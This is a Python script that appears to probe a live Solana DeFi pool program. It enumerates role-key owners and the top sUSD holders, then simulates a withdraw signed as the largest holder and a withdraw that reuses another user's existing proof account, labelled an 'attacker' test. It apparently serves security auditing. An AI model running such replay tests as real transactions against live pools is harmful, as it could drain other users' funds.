#!/usr/bin/env python3
"""battery4: manager key owner, sUSD holders, live withdraw replay, proof-reuse test, prices."""
import json, sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import solsim as S, solrpc as rpc, pda

PROG="s1aysqpEyZyijPybUV89oBGeooXrR22wMNLjnG2SWJA"
POOL="FhVcYNEe58SMtxpZGnTu2kpYJrTu2vwCZDGpPLqbd2yG"
USDC="EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
SUSD="susdabGDNbhrnCa6ncrYo81u4s9GM8ecK2UwMyZiq4X"
MANAGER="7671j7qpSf9X5KbQDraXReGK8Dxg5xGjr9n913BWhqru"
OPERATOR="AxnDY6nekRa4hEY1rm1g11A51EPPU29iAXXxh8vAqpM8"
RATEAUTH="uRwMu2114gN23NZVFxkjM6Dwk1iqSc1LLQsHMmiT6Lr"
FEERECIP="3NC1UF4pus6ditVzbcJCLFCVyBLVJm2kxKMhb3mPAoaz"
POOL_USDC_MAIN="DN2KzAeiHFnndVpjWSTw8UkwF9PZaFSthSnVoW1MVThQ"
POOL_SUSD_VAULT="FfELPrBpJBzyND1xTM6NmXRaQJbuP8c5J8jmJWZvDJds"
SUSDOFF="5P5xvu52ocJegFgdynRB2MtCJNbnw2jt6vbiAtFB8zQz"
ATA="ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"
TOKEN="TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
TOKEN22="TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
SYS="11111111111111111111111111111111"
_D = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "discriminators.json")))["instructions"]
D = {v: k for k, v in _D.items()}
def disc(n): return bytes.fromhex(D[n])
def W(k): return (k, True, False)
def R(k): return (k, False, False)
def SG(k): return (k, True, True)

out = {}
# 1. owners of role keys
for nm, k in [("manager",MANAGER),("operator",OPERATOR),("rateAuthority",RATEAUTH),
              ("feeRecipient",FEERECIP),("susdSupplyOffset",SUSDOFF)]:
    v = rpc.get_account_info(k)["result"]["value"]
    out["owner_"+nm] = None if v is None else {"owner": v["owner"], "space": v["space"], "lamports": v["lamports"], "exec": v["executable"]}
    print(nm, k, "->", out["owner_"+nm])

# 2. sUSD holders via token-2022 program accounts
accts = rpc.get_program_accounts(TOKEN22, filters=[{"memcmp": {"offset": 0, "bytes": SUSD}}], encoding="base64").get("result") or []
holders = []
import base64
for a in accts:
    d = base64.b64decode(a["account"]["data"][0])
    amt = int.from_bytes(d[64:72], "little")
    # owner at offset 32
    from solsim import b58enc
    owners = b58enc(d[32:64])
    holders.append({"acct": a["pubkey"], "owner": owners, "amount": amt})
holders.sort(key=lambda x: -x["amount"])
print("sUSD holders:", len(holders))
for h in holders[:10]: print("   ", h)
out["holders"] = holders[:30]

# 3. live withdraw replay as the top holder
top = holders[0]
NONCE = 123456789
wp = pda.proof_pda("withdraw_proof", POOL, top["owner"], NONCE, PROG)
amt = min(1000, top["amount"])
def run(label, signer, ixs):
    r = S.run(label, signer, ixs)
    print("##", label, "=> err:", r.get("err"), "cu:", r.get("cu"))
    for l in (r.get("logs") or []):
        if "failed" in l or "Error" in l or "log:" in l: print("    ", l)
    pre = {b["accountIndex"]: int(b["uiTokenAmount"]["amount"]) for b in (r.get("pre") or [])}
    post = {b["accountIndex"]: int(b["uiTokenAmount"]["amount"]) for b in (r.get("post") or [])}
    for i in sorted(set(pre)|set(post)):
        if pre.get(i)!=post.get(i): print("     delta idx%d %s -> %s" % (i, pre.get(i), post.get(i)))
    print()
    return r

res = []
res.append(run("live_withdraw_holder", top["owner"], [(
    PROG, [SG(top["owner"]), R(USDC), W(pda.ata(top["owner"], USDC)), R(SUSD), W(top["acct"]),
           W(POOL_SUSD_VAULT), W(POOL), W(wp), R(ATA), R(TOKEN), R(TOKEN22), R(SYS)],
    disc("withdraw") + NONCE.to_bytes(8,"little") + amt.to_bytes(8,"little"))]))

# 4. proof reuse: re-run same (proof now exists? no, sim doesn't persist) -> test with existing real proof account
# use the real withdraw proof 47W1bpQp... (owned by user 743Qjwz) as the proof account for attacker
EXISTING_PROOF = "47W1bpQp4MiExJBr4PgKwczGQWXEFiU4UHbv4C6fnJuP"
res.append(run("withdraw_reuse_existing_proof_attacker", "743QjwzJdZwRibbPAc4ie73JeM7aWyCZtFT3ZVJXuVN8", [(
    PROG, [SG("743QjwzJdZwRibbPAc4ie73JeM7aWyCZtFT3ZVJXuVN8"), R(USDC),
           W(pda.ata("743QjwzJdZwRibbPAc4ie73JeM7aWyCZtFT3ZVJXuVN8", USDC)), R(SUSD),
           W(pda.ata("743QjwzJdZwRibbPAc4ie73JeM7aWyCZtFT3ZVJXuVN8", SUSD, TOKEN22)),
           W(POOL_SUSD_VAULT), W(POOL), W(EXISTING_PROOF), R(ATA), R(TOKEN), R(TOKEN22), R(SYS)],
    disc("withdraw") + (0).to_bytes(8,"little") + (0).to_bytes(8,"little"))]))

out["results"] = res
json.dump(out, open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "battery4.json"),"w"), indent=1)
